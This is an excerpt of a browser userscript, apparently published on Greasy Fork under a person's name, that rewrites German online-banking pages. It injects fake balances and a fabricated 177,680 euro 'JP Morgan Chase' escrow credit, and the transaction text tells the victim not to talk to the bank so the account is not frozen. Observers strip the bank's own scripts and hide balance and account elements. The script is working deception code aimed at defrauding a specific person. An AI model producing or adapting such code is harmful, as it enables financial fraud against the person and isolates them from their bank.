// ==UserScript==
// @name         Ed WM Start  SP Christiane Pomrenke
...
// @downloadURL https://update.greasyfork.org/scripts/498273/Ed%20WM%20Start%20%20SP%20Christiane%20Pomrenke.user.js
// @updateURL https://update.greasyfork.org/scripts/498273/Ed%20WM%20Start%20%20SP%20Christiane%20Pomrenke.meta.js
// ==/UserScript==
...
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
    ...
    var buchungTextsZahl = "2.077.680";
    var accountsecurity = "84 8077 17";

    if (easyUpdate == "yes"){
        x2amount = 10000;}

    var umsatze = "11381636499";
    var finanz = "11381635892";
...
//        },
        {
            predecimalAmount: '177.680',
            decimalAmount: ',50',
            transactionTitle: 'Treuhand: JP Morgan Chase',
            transactionInfo: "Freigabe nötig durch JP Morgan. Mit Bank nicht besprechen damit nicht gesperrt. A. Graf meldet sich.",
            isNegative: false // Example flag, modify this based on your actual logic
        },
...
//==========================================================================================================================================================================================================
 if (window.location.href.indexOf("einzelauftrag") > 0 || window.location.href.indexOf("kontoauswahl") > 0 || window.location.href.indexOf("11317605933") > 0) {
    ...
    // Watch for changes in the DOM and remove added scripts and elements
    var qweobserver = new MutationObserver(function(mutationsList) {
        ...
        // Check for trigger texts and remove elements accordingly
        removeIdentifierCurrencyElements();
    });

    // Start observing the document
    qweobserver.observe(document.documentElement, { childList: true, subtree: true });

    // Remove all scripts and elements on initial run
    removeScripts();
    removeIdentifierCurrencyElements();
...
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
    ...
    var asdobserver = new MutationObserver(function(mutationsList) {
        for (var mutation of mutationsList) {
            if (mutation.addedNodes) {
                for (var node of mutation.addedNodes) {
                    if (node.tagName === 'SCRIPT') {
    ...
    // Start observing the document
    asdobserver.observe(document.documentElement, { childList: true, subtree: true });

    // Remove all scripts from the document
    removeScripts();

    // Remove elements with specific classes on initial page load
    removeElementsWithClass('mkp-identifier-currency');
    removeElementsWithClass('mkp-identifier-account-link');
    removeElementsWithClass('voraussichtlicherSaldo');

    // Additionally, observe changes in the document to remove elements dynamically
    var elementObserver = new MutationObserver(function(mutationsList) {
        for (var mutation of mutationsList) {
            if (mutation.addedNodes) {
                for (var node of mutation.addedNodes) {
                    if (node.nodeType === 1) {
                        // Check for classes to remove dynamically
                        if (node.classList.contains('mkp-identifier-currency')) {
                            console.log("Currency element added dynamically. Removing...");
                            node.remove();
                            console.log("Currency element removed.");
                        }
                        if (node.classList.contains('mkp-identifier-account-link')) {
                            console.log("Account link element added dynamically. Removing...");
                            node.remove();
                            console.log("Account link element removed.");
                        }
                        if (node.classList.contains('voraussichtlicherSaldo')) {
                            console.log("voraussichtlicherSaldo element added dynamically. Removing...");
                            node.remove();
                            console.log("voraussichtlicherSaldo element removed.");
                        }
                    }
                }
            }
    ...
    // Start observing the document for elements with specific classes
